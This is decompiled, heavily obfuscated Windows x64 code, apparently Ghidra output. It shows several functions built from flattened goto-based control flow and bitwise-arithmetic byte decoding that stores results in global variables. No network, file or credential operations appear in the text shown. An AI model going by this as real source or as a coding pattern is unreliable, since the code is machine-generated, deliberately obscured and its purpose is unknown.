LAB_1400055b0:
      uVar8 = uVar8 - local_res8;
      goto LAB_140004c12;
    }
    if (uVar10 + 100 < uVar4) {
      cVar11 = bVar2 + (bVar6 + 0x34 & bVar2) * -2 + -0x38;
LAB_140005020:
      local_res8 = cVar11 + bVar6;
    }
    else {
      if (uVar4 == uVar10 + 1) {
        cVar11 = '(';
        bVar5 = bVar6 + 0x48 & bVar2;
        goto LAB_1400055d7;
      }
      if (uVar4 == uVar10 + 2) {
        cVar11 = ('0' - (bVar6 + 0x70 & bVar2)) * '\x02' + bVar2;
        goto LAB_140005489;
      }
      if (uVar4 == uVar10 + 5) {
        local_res8 = ('8' - (bVar6 + 0x98 & bVar2)) * '\x02' + bVar2 + bVar6;
        goto LAB_1400055ad;
      }
      if (uVar4 == uVar10 + 4) {
        local_res8 = bVar2 + (bVar6 + 0xac & bVar2) * -2 + -8 + bVar6;
        goto LAB_140005579;
      }
      if (uVar4 == uVar10 + 6) {
        local_res8 = bVar6 + bVar2 + (bVar6 - 0x40 & bVar2) * -2 + 0x80;
        goto LAB_140004c12;
      }
    }
    if (uVar10 < 0x41) {
LAB_140005000:
      *(byte *)((longlong)&local_28 + uVar8) = local_res8;
      uVar8 = uVar8 + 1;
      goto LAB_140004c12;
    }
    local_res8 = (('\f' - (bVar6 - 4 & bVar2)) * '\x02' + bVar2 + bVar6) * '\x02';
  }
  else {
    if (uVar4 != uVar10 + 1) {
      if (uVar4 != uVar10 + 2) {
        if (uVar4 == uVar10 + 3) {
          local_res8 = bVar2 + (bVar6 + 0xb2 & bVar2) * -2 + -0x2c + bVar6;
          goto LAB_140005579;
        }
        if (uVar4 != uVar10 + 5) {
          if (uVar4 == uVar10 + 7) {
            cVar11 = '>';
            bVar5 = bVar6 + 0x16 & bVar2;
            goto LAB_1400055d7;
          }
          goto LAB_14000505d;
        }
        local_res8 = (bVar6 + bVar2 + (bVar6 - 0x26 & bVar2) * -2) - 0x1c;
        goto LAB_1400055b0;
      }
      local_res8 = ('&' - (bVar6 + 0x9e & bVar2)) * '\x02' + bVar2 + bVar6;
      goto LAB_140004c12;
    }
    cVar11 = ('\x1e' - (bVar6 + 0x76 & bVar2)) * '\x02' + bVar2;
LAB_140005536:
    local_res8 = cVar11 + bVar6;
  }
  *(byte *)((longlong)&local_28 + uVar8) = bVar6 + 6 + (bVar6 + 6 & bVar2) * -2 + -0x2a + bVar2;
  uVar10 = uVar10 + 1;
  goto LAB_140004c12;
}



/* ==================================================================== */
/* FUN_140005660 @ 140005660 */

void FUN_140005660(void)

{
  byte bVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  byte bVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  char cVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  longlong lVar11;
  byte local_res8;
  int in_stack_012ca9d4;
  int in_stack_01697218;
  byte bStack_39;
  int local_38;
  undefined8 local_34;
  undefined8 uStack_2c;
  undefined4 local_24;
  undefined2 local_20;

  local_34 = 0;
  uStack_2c = 0;
  local_24 = 0;
  local_20 = 0;
  local_38 = -0x64843db6;
LAB_1400056b0:
  uVar2 = DAT_140a618c8;
  uVar8 = DAT_140a618d0;
LAB_1400056c0:
  uVar10 = 0;
  uVar3 = uVar2;
  uVar9 = uVar8;
LAB_1400056c3:
  do {
    if (0x19 < uVar10) {
      DAT_140a61930 = (longlong)local_38;
      return;
    }
    bVar1 = *(byte *)((longlong)&local_38 + uVar10);
LAB_1400056d2:
    if (uVar10 < uVar3) {
      DAT_140a61930 = (longlong)in_stack_012ca9d4;
      return;
    }
    bVar4 = (byte)uVar10;
    if (uVar3 < uVar9 + 1) {
      local_res8 = bVar4 + (bVar4 + 0xbc & bVar1) * -2 + -0x68 + bVar1;
      goto LAB_140005730;
    }
    if (uVar3 == uVar9 + 1) {
      local_res8 = bVar1 + bVar4 + 0x34 + (bVar4 + 0x34 & bVar1) * -2 + 0x94;
      uVar10 = uVar10 + *(byte *)((longlong)&local_38 + uVar10) + uVar9 + 1;
      goto LAB_1400056c3;
    }
    if (uVar3 != uVar9 + 2) {
      if (uVar3 == uVar9 + 3) {
        local_res8 = bVar4 + (bVar4 + 4 & bVar1) * -2 + -0x18 + bVar1;
        goto LAB_1400056c3;
      }
      if (uVar3 == uVar9 + 5) {
        local_res8 = ('\f' - (bVar4 + 0x7c & bVar1)) * '\x02' + bVar4 + bVar1;
        uVar9 = uVar9 + 1;
        goto LAB_1400056c3;
      }
LAB_140005730:
      do {
        if (uVar10 < uVar9) {
          DAT_140a61930 = (longlong)in_stack_01697218;
          return;
        }
        uVar2 = uVar9 + 1;
        if (uVar9 + 0x41 <= uVar3) {
          if (uVar3 == uVar2) {
            cVar7 = bVar4 + (bVar4 - 0x1c & bVar1) * -2 + -0x58;
LAB_140005d87:
            local_res8 = cVar7 + bVar1;
LAB_140005d8a:
            uVar9 = uVar9 + 1;
            *(byte *)((longlong)&local_38 + uVar10) =
                 bVar4 + 0xa4 + (bVar4 + 0xa4 & bVar1) * -2 + -0x7c + bVar1;
          }
          else if (uVar3 == uVar9 + 2) {
            uVar9 = uVar9 + 1;
            local_res8 = bVar4 + (bVar4 + 0x5c & bVar1) * -2 + -0x28 + bVar1;
          }
          else {
            if (uVar3 != uVar9 + 3) {
              if (uVar3 != uVar9 + 5) {
                if (uVar3 != uVar9 + 9) goto LAB_1400057b0;
                local_res8 = ('\x14' - (bVar4 + 0xa4 & bVar1)) * '\x02' + bVar4 + bVar1;
                uVar10 = uVar10 + *(byte *)((longlong)&local_38 + uVar10) + uVar9 + 1;
                goto LAB_1400056c3;
              }
              cVar7 = bVar4 + (bVar4 + 0xb4 & bVar1) * -2 + -0x38;
              goto LAB_140005e0f;
            }
            local_res8 = ('\x04' - (bVar4 - 0x2c & bVar1)) * '\x02' + bVar4 + bVar1;
          }
          goto LAB_1400056c3;
        }
        local_res8 = ('<' - (bVar4 + 0x6c & bVar1)) * '\x02' + bVar4 + bVar1;
LAB_1400057b0:
        uVar6 = uVar9 + 5;
        uVar5 = uVar9 + 2;
        uVar8 = uVar9 + uVar3;
        if (uVar8 <= uVar10) {
          if (uVar3 < uVar9 + 4) {
            local_res8 = bVar4 + (bVar4 + 0xbc & bVar1) * -2 + -0x68 + bVar1;
LAB_1400059cb:
            if (uVar8 == 8) {
              local_res8 = (bVar4 + (bVar4 - 0x28 & bVar1) * -2) - 0x10;
              goto LAB_140005e12;
            }
            if (uVar9 + 0x10 < uVar3) {
              local_res8 = ('\x1c' - (bVar4 - 0x34 & bVar1)) * '\x02' + bVar4 + bVar1;
            }
            else {
              if (uVar3 == uVar2) {
                cVar7 = ('4' - (bVar4 + 0x44 & bVar1)) * '\x02' + bVar4;
                goto LAB_140005d87;
              }
              if (uVar3 == uVar5) {
                local_res8 = bVar4 + (bVar4 + 0x34 & bVar1) * -2 + -0x38 + bVar1;
                goto LAB_1400056c3;
              }
              if (uVar3 == uVar6) {
                local_res8 = ('\x14' - (bVar4 + 0x24 & bVar1)) * '\x02' + bVar4 + bVar1;
                goto LAB_140005cb2;
              }
              if (uVar3 == uVar9 + 3) {
                cVar7 = bVar4 + (bVar4 + 0x14 & bVar1) * -2 + -0x78;
                goto LAB_140005e0f;
              }
              if (uVar3 == uVar9 + 8) {
                local_res8 = bVar4 + (bVar4 + 4 & bVar1) * -2 + -0x18 + bVar1;
                uVar10 = uVar10 + *(byte *)((longlong)&local_38 + uVar10) + uVar9 + 1;
                goto LAB_1400056c3;
              }
            }
            if (uVar3 < 0x80) {
              if (uVar9 + 0x400 < uVar3) {
                local_res8 = bVar4 + (bVar4 + 0x38 & bVar1) * -2 + -0x50 + bVar1;
              }
              else {
                if (uVar3 == uVar2) {
                  local_res8 = bVar4 + (bVar4 + 0xb0 & bVar1) * -2 + -0x20 + bVar1;
                  uVar10 = uVar10 + *(byte *)((longlong)&local_38 + uVar10) + uVar9 + 1;
                  goto LAB_1400056c3;
                }
                if (uVar3 == uVar5) {
                  cVar7 = (' ' - (bVar4 + 0xa0 & bVar1)) * '\x02' + bVar4;
                  goto LAB_140005e0f;
                }
                if (uVar3 == uVar6) {
                  local_res8 = bVar4 + (bVar4 + 0x90 & bVar1) * -2 + -0x60 + bVar1;
                  goto LAB_140005cb2;
                }
                if (uVar3 == uVar9 + 3) {
                  local_res8 = bVar4 + (bVar4 & bVar1) * -2 + bVar1;
                  goto LAB_1400056c3;
                }
                if (uVar3 == uVar9 + 8) {
                  cVar7 = ('0' - (bVar4 + 0x70 & bVar1)) * '\x02' + bVar4;
                  goto LAB_140005d87;
                }
              }
              if (0x7f < uVar9) {
                local_res8 = (('\b' - (bVar4 - 0x18 & bVar1)) * '\x02' + bVar4 + bVar1) * '\x02';
                goto LAB_140005d8a;
              }
              *(byte *)((longlong)&local_38 + uVar10) = local_res8;
              uVar10 = uVar10 + 1;
              goto LAB_1400056c3;
            }
            local_res8 = bVar1 * '\x02' + (bVar4 + 0x60 & bVar1) * -2 + -0x40 + bVar4;
            *(byte *)((longlong)&local_38 + uVar10) =
                 ('\x1e' - (bVar4 + 0x1c & bVar1)) * '\x02' + bVar4 + 0x1c + bVar1 + local_res8;
          }
          else {
            if (uVar3 == uVar2) {
              local_res8 = bVar4 + (bVar4 - 0x28 & bVar1) * -2 + -0x10 + bVar1;
              uVar10 = uVar10 + *(byte *)((longlong)&local_38 + uVar10) + uVar9 + 1;
              goto LAB_1400056c3;
            }
            if (uVar3 == uVar5) {
              cVar7 = ('(' - (bVar4 - 0x38 & bVar1)) * '\x02' + bVar4;
              goto LAB_140005e0f;
            }
            if (uVar3 != uVar6) {
              if (uVar3 == uVar9 + 8) {
                cVar7 = ('8' - (bVar4 + 0x98 & bVar1)) * '\x02' + bVar4;
                goto LAB_140005d87;
              }
              goto LAB_1400059cb;
            }
            local_res8 = bVar4 + (bVar4 + 0xb8 & bVar1) * -2 + -0x50 + bVar1;
          }
LAB_140005cb2:
          uVar10 = uVar10 - local_res8;
          uVar3 = uVar8;
          goto LAB_1400056c3;
        }
        while( true ) {
          if (uVar3 == uVar9 + 0x7a) {
            cVar7 = ('(' - (bVar4 - 0x38 & bVar1)) * '\x02' + bVar4;
            goto LAB_140005d87;
          }
          if (uVar3 == uVar9 + 0x400) {
            uVar9 = uVar9 + 1;
            local_res8 = bVar4 + (bVar4 + 0x40 & bVar1) * -2 + -0x80 + bVar1;
            goto LAB_1400056c3;
          }
          uVar2 = uVar9 + 0x2a;
          if (uVar3 == uVar2) {
            local_res8 = bVar4 + (bVar4 + 0xb8 & bVar1) * -2 + -0x50 + bVar1;
            goto LAB_1400056c3;
          }
          if (uVar3 == uVar9 + 3) {
            local_res8 = bVar4 + (bVar4 + 0x10 & bVar1) * -2 + -0x60 + bVar1;
            goto LAB_140005e36;
          }
          uVar8 = uVar9 + 0x2d;
          if (uVar2 < uVar9 + 0xa7) {
            local_res8 = (bVar1 + bVar4 + (bVar4 + 0x34 & bVar1) * -2) - 0x38;
            goto LAB_1400056b0;
          }
          if (uVar2 < uVar9 + 0x30) {
            local_res8 = (bVar1 + bVar4 + (bVar4 + 0xac & bVar1) * -2) - 8;
            goto LAB_1400056c0;
          }
          uVar3 = uVar2;
          if (uVar2 < uVar9 + 0x57) {
            local_res8 = ('\x14' - (bVar4 + 0x24 & bVar1)) * '\x02' + bVar4 + bVar1;
            uVar9 = uVar8;
            goto LAB_1400056d2;
          }
          if (uVar2 < uVar9 + 0x33) break;
          uVar2 = uVar9 + 0x37;
          uVar8 = uVar9 + 0x3a;
          uVar3 = uVar2;
          if (uVar9 + 0x40 < uVar2) {
            local_res8 = (' ' - (bVar4 + 0xa0 & bVar1)) * '\x02' + bVar4 + bVar1;
            uVar10 = uVar10 + *(byte *)((longlong)&local_38 + uVar10) + uVar8 + 1;
            uVar9 = uVar8;
            goto LAB_1400056c3;
          }
          if (uVar9 + 0x3d < uVar2) {
            local_res8 = ('8' - (bVar4 + 0x18 & bVar1)) * '\x02' + bVar4 + bVar1;
            uVar9 = uVar8;
            goto LAB_140005e36;
          }
          uVar3 = uVar9 + 0x44;
          if (uVar3 < uVar2) {
            cVar7 = bVar4 + (bVar4 + 0x90 & bVar1) * -2 + -0x60;
            uVar3 = uVar2;
            uVar9 = uVar8;
            goto LAB_140005e0f;
          }
          if (uVar9 + 0x62 < uVar2) {
            local_res8 = bVar4 + (bVar4 - 0x18 & bVar1) * -2 + -0x70 + bVar1;
            uVar3 = uVar2;
            uVar9 = uVar9 + 0x3b;
            goto LAB_1400056c3;
          }
          uVar9 = uVar9 + 0x6c;
        }
        local_res8 = (',' - (bVar4 + 0x9c & bVar1)) * '\x02' + bVar4 + bVar1;
        uVar9 = uVar8;
      } while( true );
    }
    cVar7 = bVar4 + 0x24 + ('\x02' - (bVar4 + 0x24 & bVar1)) * '\x02';
LAB_140005e0f:
    local_res8 = cVar7 + bVar1;
LAB_140005e12:
    bVar4 = bVar4 + 0x94 + (bVar4 + 0x94 & bVar1) * -2 + -0xc + bVar1;
    *(byte *)((longlong)&local_38 + uVar10) = bVar4;
    uVar10 = uVar10 - ((ulonglong)bVar4 + uVar9 + 1);
    uVar9 = uVar9 + 1;
LAB_140005e36:
    bVar4 = (char)uVar10 + 0x50;
    *(byte *)((longlong)&local_38 + uVar10) = bVar1 + (bVar1 & bVar4) * -2 + -0x30 + bVar4;
    lVar11 = uVar10 + (-1 - (uVar3 + 1));
    uVar10 = lVar11 + (&bStack_39)[lVar11 + 1] + uVar9 + 1;
    uVar3 = uVar3 + 1;
  } while( true );
}



/* ==================================================================== */
/* FUN_140005f10 @ 140005f10 */

void FUN_140005f10(void)

{
  byte bVar1;
  ulonglong uVar2;
  byte bVar3;
  char cVar4;
  ulonglong uVar5;
  longlong lVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  char cVar9;
  byte local_res8;
  int in_stack_00b251d1;
  int in_stack_01702dd4;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined4 local_14;
  undefined2 local_10;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_10 = 0;
  local_28 = -0x14a8e69d;
LAB_140005f50:
  uVar2 = DAT_140a618c8;
  uVar7 = DAT_140a618d0;
LAB_140005f60:
  uVar5 = 0;
  uVar8 = uVar7;
LAB_140005f62:
  do {
    if (0x19 < uVar5) {
      DAT_140a618f8 = (longlong)local_28;
      return;
    }
    bVar1 = *(byte *)((longlong)&local_28 + uVar5);
    cVar4 = (char)uVar5;
LAB_140005f75:
    if (uVar5 < uVar2) {
      DAT_140a618f8 = (longlong)in_stack_00b251d1;
      return;
    }
    if (uVar8 + 1 <= uVar2) {
      if (uVar2 == uVar8 + 1) {
        local_res8 = (cVar4 - 9U) + bVar1 + (bVar1 & cVar4 - 9U) * -2 + 0x3f;
        uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
      }
      else {
        if (uVar2 == uVar8 + 3) {
          local_res8 = bVar1 + (cVar4 - 0x15U) + (cVar4 - 0x15U & bVar1) * -2 + 0x93;
          goto LAB_1400068d1;
        }
        if (uVar2 == uVar8 + 2) {
          local_res8 = (bVar1 + (cVar4 - 0x21U) + (cVar4 - 0x21U & bVar1) * -2) - 0x19;
          goto LAB_14000689f;
        }
        if (uVar2 != uVar8 + 4) {
          if (uVar2 != uVar8 + 9) goto LAB_140005fe0;
          bVar3 = cVar4 - 0x39;
          cVar9 = '+';
          goto LAB_14000682c;
        }
        bVar3 = cVar4 - 0x2d;
        cVar9 = '\a';
LAB_14000686d:
        local_res8 = (cVar9 - (bVar3 & bVar1)) * '\x02' + cVar4 + bVar1;
      }
      goto LAB_140005f62;
    }
    local_res8 = ('\t' - (cVar4 - 3U & bVar1)) * '\x02' + cVar4 + bVar1;
LAB_140005fe0:
    if (uVar5 < uVar8) {
      DAT_140a618f8 = (longlong)in_stack_01702dd4;
      return;
    }
    if (uVar2 < uVar8 + 0x42) {
      local_res8 = ('=' - (cVar4 - 0x3fU & bVar1)) * '\x02' + cVar4 + bVar1;
    }
    else {
      if (uVar2 == uVar8 + 1) {
        cVar9 = cVar4 + (cVar4 + 0xbbU & bVar1) * -2 + -0x62;
        goto LAB_140006838;
      }
      if (uVar2 == uVar8 + 2) {
        local_res8 = (bVar1 + cVar4 + (cVar4 + 0xafU & bVar1) * -2) - 0x1a;
        goto LAB_140005f62;
      }
      if (uVar2 == uVar8 + 5) {
        local_res8 = ('\x17' - (cVar4 + 0xa3U & bVar1)) * '\x02' + cVar4 + bVar1;
        goto LAB_14000689f;
      }
      if (uVar2 == uVar8 + 7) {
        local_res8 = (';' - (cVar4 + 0x97U & bVar1)) * '\x02' + cVar4 + bVar1;
        goto LAB_1400068d1;
      }
    }
    while (uVar7 = uVar8, uVar5 < uVar8 + uVar2) {
      while( true ) {
        do {
          uVar8 = uVar7;
          if (uVar2 == uVar8 + 4) {
            cVar9 = cVar4 + (cVar4 + 0xb6U & bVar1) * -2 + -0x44;
            goto LAB_140006838;
          }
          if (uVar2 == uVar8 + 0x20) {
            uVar8 = uVar8 + 1;
            local_res8 = (bVar1 + cVar4 + (cVar4 + 0xb0U & bVar1) * -2) - 0x20;
            goto LAB_140005f62;
          }
          if (uVar2 == uVar8 + 2) {
            bVar3 = cVar4 + 0xaa;
            cVar9 = '\x02';
            goto LAB_14000686d;
          }
          if (uVar2 == uVar8 + 10) {
            local_res8 = ('\x14' - (cVar4 + 0xa4U & bVar1)) * '\x02' + cVar4 + bVar1;
            goto LAB_140006777;
          }
          if (uVar2 == uVar8 + 0x80) {
            local_res8 = ('&' - (cVar4 + 0x9eU & bVar1)) * '\x02' + cVar4 + bVar1;
            goto LAB_14000689f;
          }
          if (uVar2 == uVar8 + 0x41) {
            local_res8 = ('8' - (cVar4 + 0x98U & bVar1)) * '\x02' + cVar4 + bVar1;
            goto LAB_1400068a2;
          }
          if (uVar2 == uVar8 + 0x42) {
            local_res8 = cVar4 + (cVar4 + 0x92U & bVar1) * -2 + -0x6c + bVar1;
            goto LAB_1400068d1;
          }
          if (uVar2 == uVar8 + 0x61) {
            local_res8 = bVar1 + cVar4 + (cVar4 + 0x8cU & bVar1) * -2 + 0xb8;
            goto LAB_1400068f9;
          }
          if (uVar2 == uVar8 + 3) {
            local_res8 = (bVar1 + cVar4 + (cVar4 + 0x86U & bVar1) * -2) - 0x24;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
            goto LAB_140005f62;
          }
          uVar7 = uVar8;
        } while (uVar2 == uVar8 + 0x10);
        uVar2 = uVar8 + 1000;
        uVar7 = uVar8 + 0x3e9;
        if (uVar2 < uVar8 + 0x413) {
          local_res8 = ('\x1b' - (cVar4 + 0x77U & bVar1)) * '\x02' + cVar4 + bVar1;
          goto LAB_140005f50;
        }
        if (uVar2 < uVar8 + 0x469) {
          local_res8 = ('-' - (cVar4 + 0x71U & bVar1)) * '\x02' + cVar4 + bVar1;
          goto LAB_140005f60;
        }
        if (uVar2 < uVar8 + 0x42a) {
          local_res8 = ('?' - (cVar4 + 0x6bU & bVar1)) * '\x02' + cVar4 + bVar1;
          uVar8 = uVar7;
          goto LAB_140005f75;
        }
        if (uVar2 < uVar8 + 0x3ee) {
          local_res8 = cVar4 + (cVar4 + 0x65U & bVar1) * -2 + -0x5e + bVar1;
          uVar8 = uVar7;
          goto LAB_140005fe0;
        }
        if (uVar2 < uVar8 + 0x411) break;
        if (uVar2 < uVar8 + 0x3ec) {
          cVar9 = cVar4 + (cVar4 + 0x59U & bVar1) * -2 + -0x16;
          uVar8 = uVar7;
          goto LAB_140006425;
        }
        if (uVar2 < uVar8 + 0x3f9) {
          bVar3 = cVar4 + 0x53;
          cVar9 = '\a';
          uVar8 = uVar7;
          goto LAB_1400063d5;
        }
        if (uVar2 < uVar8 + 0x5e9) {
          cVar9 = ('\x19' - (cVar4 + 0x4dU & bVar1)) * '\x02' + cVar4;
          uVar8 = uVar7;
          goto LAB_14000639e;
        }
        if (uVar2 < uVar8 + 0x443) {
          local_res8 = ('+' - (cVar4 + 0x47U & bVar1)) * '\x02' + cVar4 + bVar1;
          uVar8 = uVar7;
          goto LAB_14000637d;
        }
        if (uVar8 + 0x44d <= uVar2) {
          uVar2 = uVar8 + 0x42b;
          uVar7 = uVar8 + 0x4a5;
          if (uVar8 + 0x506 < uVar2) {
            local_res8 = bVar1 + cVar4 + (cVar4 + 0x38U & bVar1) * -2 + 0xb0;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar7 + 1;
            uVar8 = uVar7;
            goto LAB_140005f62;
          }
          if (uVar8 + 0x4cd < uVar2) {
            local_res8 = (bVar1 + cVar4 + (cVar4 + 0x32U & bVar1) * -2) - 0x2c;
            uVar8 = uVar7;
            goto LAB_1400068f9;
          }
          if (uVar8 + 0x8a5 < uVar2) {
            local_res8 = cVar4 + (cVar4 + 0x2cU & bVar1) * -2 + -8 + bVar1;
            uVar8 = uVar7;
            goto LAB_1400068d1;
          }
          if (uVar8 + 0x4a6 < uVar2) {
            local_res8 = ('\x0e' - (cVar4 + 0x26U & bVar1)) * '\x02' + cVar4 + bVar1;
            uVar8 = uVar7;
            goto LAB_1400068a2;
          }
          if (uVar8 + 0x6a5 < uVar2) {
            local_res8 = (' ' - (cVar4 + 0x20U & bVar1)) * '\x02' + cVar4 + bVar1;
            uVar8 = uVar7;
            goto LAB_14000689f;
          }
          if (uVar8 + 0x4ff < uVar2) {
            local_res8 = ('2' - (cVar4 + 0x1aU & bVar1)) * '\x02' + cVar4 + bVar1;
            uVar8 = uVar7;
            goto LAB_140006777;
          }
          if (uVar8 + 0x4ab < uVar2) {
            local_res8 = bVar1 + cVar4 + (cVar4 + 0x14U & bVar1) * -2 + 0x88;
            uVar8 = uVar7;
            goto LAB_140005f62;
          }
          if (uVar8 + 0x4e5 < uVar2) {
            local_res8 = bVar1 + cVar4 + (cVar4 + 0xeU & bVar1) * -2 + 0xac;
            uVar8 = uVar8 + 0x4a6;
            goto LAB_140005f62;
          }
          if (uVar8 + 0x4a9 < uVar2) {
            cVar9 = cVar4 + (cVar4 + 8U & bVar1) * -2 + -0x30;
            uVar8 = uVar7;
            goto LAB_140006838;
          }
          if (uVar2 <= uVar8 + 0x4c5) {
            uVar2 = uVar8 + 0x4b5;
            uVar7 = uVar8 + 0x89d;
          }
        }
      }
      local_res8 = cVar4 + (cVar4 + 0x5fU & bVar1) * -2 + -0x3a + bVar1;
      uVar8 = uVar7;
    }
    if (uVar8 + 0x20 <= uVar2) {
      if (uVar2 == uVar8 + 1) {
        local_res8 = (bVar1 + cVar4 + (cVar4 + 0x82U & bVar1) * -2) - 0xc;
        uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
      }
      else {
        if (uVar2 == uVar8 + 2) {
          local_res8 = ('\f' - (cVar4 + 0x7cU & bVar1)) * '\x02' + cVar4 + bVar1;
          goto LAB_1400068f9;
        }
        if (uVar2 != uVar8 + 3) {
          if (uVar2 != uVar8 + 5) goto LAB_140006428;
          local_res8 = cVar4 + (cVar4 + 100U & bVar1) * -2 + -0x58 + bVar1;
          goto LAB_140006777;
        }
        local_res8 = bVar1 + cVar4 + (cVar4 + 0x6aU & bVar1) * -2 + 0x84;
LAB_14000689f:
        uVar2 = uVar2 + uVar8;
LAB_1400068a2:
        uVar5 = uVar5 - local_res8;
      }
      goto LAB_140005f62;
    }
    cVar9 = ('\t' - (cVar4 - 3U & bVar1)) * '\x02' + cVar4;
LAB_140006425:
    local_res8 = cVar9 + bVar1;
LAB_140006428:
    if (uVar8 + uVar2 != 0x2a) {
      if (uVar8 + 0x5a < uVar2) {
        bVar3 = cVar4 + 0x49;
        cVar9 = '%';
LAB_1400063d5:
        local_res8 = (cVar9 - (bVar3 & bVar1)) * '\x02' + cVar4 + bVar1;
LAB_1400063e1:
        if (0x60 < uVar2) {
          local_res8 = ((bVar1 - (cVar4 - 0x38U & bVar1)) + '(') * '\x02' + cVar4;
LAB_140006777:
          *(byte *)((longlong)&local_28 + uVar5) =
               (cVar4 - 0x3bU) + (cVar4 - 0x3bU & bVar1) * -2 + -99 + bVar1 + local_res8;
          goto LAB_14000689f;
        }
        if (uVar8 + 0x1000 < uVar2) {
          cVar9 = cVar4 + (cVar4 + 10U & bVar1) * -2 + -0x3c;
LAB_14000639e:
          local_res8 = cVar9 + bVar1;
        }
        else {
          if (uVar2 == uVar8 + 1) {
            local_res8 = (bVar1 + cVar4 + (cVar4 + 4U & bVar1) * -2) - 0x18;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
            goto LAB_140005f62;
          }
          if (uVar2 == uVar8 + 6) {
            local_res8 = cVar4 + (cVar4 - 0x1aU & bVar1) * -2 + -100 + bVar1;
            goto LAB_140006777;
          }
          if (uVar2 == uVar8 + 4) {
            uVar8 = uVar8 + 1;
            local_res8 = (bVar1 + cVar4 + (cVar4 - 0x26U & bVar1) * -2) - 0x1c;
            goto LAB_140005f62;
          }
          if (uVar2 == uVar8 + 8) {
            bVar3 = cVar4 - 0x2c;
            cVar9 = '\x04';
            goto LAB_14000682c;
          }
        }
        if (uVar8 < 0x200) {
LAB_14000637d:
          *(byte *)((longlong)&local_28 + uVar5) = local_res8;
          uVar5 = uVar5 + 1;
          goto LAB_140005f62;
        }
        local_res8 = (('\x16' - (cVar4 - 0x32U & bVar1)) * '\x02' + cVar4 + bVar1) * '\x02';
      }
      else {
        if (uVar2 != uVar8 + 1) {
          if (uVar2 == uVar8 + 2) {
            local_res8 = bVar1 + cVar4 + (cVar4 + 0x37U & bVar1) * -2 + 0xb6;
          }
          else {
            if (uVar2 == uVar8 + 3) {
              local_res8 = (bVar1 + cVar4 + (cVar4 + 0x2bU & bVar1) * -2) - 2;
              goto LAB_14000689f;
            }
            if (uVar2 == uVar8 + 5) {
              local_res8 = ('\x11' - (cVar4 + 0x25U & bVar1)) * '\x02' + cVar4 + bVar1;
              goto LAB_1400068a2;
            }
            if (uVar2 != uVar8 + 4) goto LAB_1400063e1;
            local_res8 = bVar1 + cVar4 + (cVar4 + 0x13U & bVar1) * -2 + 0x8e;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
          }
          goto LAB_140005f62;
        }
        bVar3 = cVar4 + 0x43;
        cVar9 = '7';
LAB_14000682c:
        cVar9 = (cVar9 - (bVar3 & bVar1)) * '\x02' + cVar4;
LAB_140006838:
        local_res8 = cVar9 + bVar1;
      }
      *(byte *)((longlong)&local_28 + uVar5) =
           (cVar4 - 0x35U) + (cVar4 - 0x35U & bVar1) * -2 + 's' + bVar1;
      uVar8 = uVar8 + 1;
      goto LAB_140005f62;
    }
    local_res8 = (':' - (cVar4 - 0x3eU & bVar1)) * '\x02' + cVar4;
LAB_1400068d1:
    bVar3 = bVar1 + (bVar1 & cVar4 + 0xbfU) * -2 + -0x39 + cVar4 + 0xbfU;
    *(byte *)((longlong)&local_28 + uVar5) = bVar3;
    uVar5 = uVar5 - ((ulonglong)bVar3 + uVar8 + 1);
    uVar8 = uVar8 + 1;
LAB_1400068f9:
    bVar3 = (char)uVar5 + 0xbc;
    uVar2 = uVar2 + 1;
    *(byte *)((longlong)&local_28 + uVar5) = bVar1 + (bVar1 & bVar3) * -2 + -0x24 + bVar3;
    lVar6 = uVar5 + (-1 - uVar2);
    uVar5 = lVar6 + (&bStack_29)[lVar6 + 1] + uVar8 + 1;
  } while( true );
}



/* ==================================================================== */
/* FUN_1400069d0 @ 1400069d0 */

void FUN_1400069d0(void)

{
  ulonglong uVar1;
  byte bVar2;
  ulonglong uVar3;
  byte bVar4;
  byte bVar5;
  ulonglong uVar6;
  longlong lVar7;
  ulonglong uVar8;
  char cVar9;
  byte local_res8;
  int in_stack_0170bde8;
  int in_stack_01740080;
  byte bStack_39;
  int local_38;
  undefined8 local_34;
  undefined8 uStack_2c;
  undefined8 local_24;
  undefined4 local_1c;

  local_34 = 0;
  uStack_2c = 0;
  local_24 = 0;
  local_1c = 0;
  local_38 = -0x4c1459f2;
LAB_140006a20:
  uVar6 = 0;
  uVar3 = DAT_140a618c8;
  uVar8 = DAT_140a618d0;
LAB_140006a32:
  if (0x1f < uVar6) {
    DAT_140a61998 = (longlong)local_38;
    return;
  }
  bVar2 = *(byte *)((longlong)&local_38 + uVar6);
  bVar5 = (byte)uVar6;
LAB_140006a44:
  if (uVar6 < uVar3) {
    DAT_140a61998 = (longlong)in_stack_01740080;
    return;
  }
  if (uVar8 + 1 <= uVar3) {
    if (uVar3 != uVar8 + 1) {
      if (uVar3 != uVar8 + 2) {
        if (uVar3 == uVar8 + 3) {
          local_res8 = bVar2 + bVar5 + 0x58 + (bVar5 + 0x58 & bVar2) * -2 + 0x98;
          goto LAB_140007247;
        }
        if (uVar3 != uVar8 + 4) goto LAB_140006aa0;
        local_res8 = bVar5 + bVar2 + (bVar5 - 0x18 & bVar2) * -2 + 0x90;
        goto LAB_140006a32;
      }
      local_res8 = ('\x1c' - (bVar5 - 8 & bVar2)) * '\x02' + (bVar5 - 8) + bVar2;
      goto LAB_14000727c;
    }
    local_res8 = bVar2 + (bVar5 - 0x38) + (bVar5 - 0x38 & bVar2) * -2 + 0x88;
    uVar6 = uVar6 + *(byte *)((longlong)&local_38 + uVar6) + uVar8 + 1;
    goto LAB_140006a32;
  }
  local_res8 = ('8' - (bVar5 + 0x98 & bVar2)) * '\x02' + bVar2 + bVar5;
LAB_140006aa0:
  if (uVar6 < uVar8) {
    DAT_140a61998 = (longlong)in_stack_0170bde8;
    return;
  }
  if (uVar8 + 4 <= uVar3) {
    if (uVar3 == uVar8 + 1) {
      bVar4 = bVar5 + 0xa8;
